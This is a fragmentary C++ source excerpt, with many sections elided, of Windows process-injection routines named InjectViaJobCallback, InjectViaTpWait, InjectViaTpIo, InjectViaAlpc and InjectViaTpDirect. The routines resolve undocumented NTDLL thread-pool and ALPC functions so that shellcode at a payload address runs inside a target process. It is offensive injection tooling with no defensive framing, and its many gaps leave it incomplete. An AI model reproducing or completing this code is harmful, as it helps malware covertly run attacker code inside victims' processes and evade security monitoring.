...
bool InjectViaJobCallback(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort)
{
    ...
    fnTpAllocJobNotification pTpAllocJobNotification = reinterpret_cast<fnTpAllocJobNotification>(
        GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "TpAllocJobNotification"));
    ...
    status = pTpAllocJobNotification(
        &pFullTpJob, 
        hJob,
        payloadAddress,
        nullptr,
...
bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort)
{
    ...
    pTpWait = (PFULL_TP_WAIT)CreateThreadpoolWait(
        static_cast<PTP_WAIT_CALLBACK>(payloadAddress),
        nullptr,
        nullptr
    );
    ...
    status = pNtAssociateWaitCompletionPacket(
        pTpWait->WaitPkt, //< This Wait packet is associated with the shellcode
...
bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort)
{
    ...
    pNtSetInformationFile = reinterpret_cast<fnNtSetInformationFile>(GetProcAddress(
    ...
    //
    pTpIo = reinterpret_cast<PFULL_TP_IO>(CreateThreadpoolIo(
        hFile,
...
void _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer)
{
    if ((UsStruct->Buffer = (PWSTR)Buffer)) {
        ...
        UsStruct->Length = UsStruct->MaximumLength = 0;
    }
}
...
bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort)
{
    ...
    //
    pNtAlpcCreatePort      = reinterpret_cast<fnNtAlpcCreatePort>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcCreatePort"));
    pTpAllocAlpcCompletion = reinterpret_cast<fnTpAllocAlpcCompletion>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "TpAllocAlpcCompletion"));
    pNtAlpcSetInformation  = reinterpret_cast<fnNtAlpcSetInformation>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcSetInformation"));
    pNtAlpcConnectPort     = reinterpret_cast<fnNtAlpcConnectPort>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcConnectPort"));
    ...
    // Create Second Port
    //
    _RtlInitUnicodeString(&usAlpcPortName, L"\\RPC Control\\UriensApcPort");
...
bool InjectViaTpDirect(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort)
{
    ...
    pNtSetIoCompletion = reinterpret_cast<fnNtSetIoCompletion>(
